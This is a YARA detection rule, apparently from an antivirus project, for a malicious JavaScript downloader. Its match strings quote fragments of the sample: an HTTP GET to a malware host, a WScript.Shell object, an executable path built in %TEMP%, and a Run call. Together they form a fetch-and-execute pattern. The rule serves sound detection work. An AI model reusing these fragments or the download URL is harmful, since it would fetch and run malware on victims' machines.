rule sig_20160330_cec6545887eaa8dacea4168f529ca5c4 {
  meta:
    description = "datamaliciousorder - file 20160330_cec6545887eaa8dacea4168f529ca5c4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5e21d553734d27f68a9613bf1c6b942c745b56456776513a869ff21f3e774e19"

  strings:
    $s1  = "Q[IP](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "var U = function F() {return WScript[BO](\"WScript\"+\".Shell\");}(), G = 11;" fullword ascii
    $s3  = "function J(XV, FP){EL = EL * 1; return XV - FP;};" fullword ascii
    $s4  = "if (Q[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function O(){return AW + \"\";};" fullword ascii
    $s6  = "function GW() {return U[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1b71Omg6zYWJKs.ex\" + \"e\";};" fullword ascii
    $s7  = "function K(E){U[\"Run\"](E, EL, EL);};" fullword ascii
    $s8  = "function A() {return ((HW == true) && (HW == DP)) ? 1 : EL;};" fullword ascii
    $s9  = "}while (P);" fullword ascii
    $s10 = "function SN(){return BO;};" fullword ascii
    $s11 = "var E0 = new this[\"Date\"]();" fullword ascii
    $s12 = "function V()" fullword ascii
    $s13 = "function R(NP) {var B = (1, 2, 3, 4, 5, NP); return B;};" fullword ascii
    $s14 = "function VZ(){return 22;};" fullword ascii
    $s15 = "return J(H, EV);" fullword ascii
    $s16 = "var DP = false;" fullword ascii
    $s17 = "var WS = false;" fullword ascii
    $s18 = "var HW = false;" fullword ascii
    $s19 = "HW = true; " fullword ascii
    $s20 = "DP = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}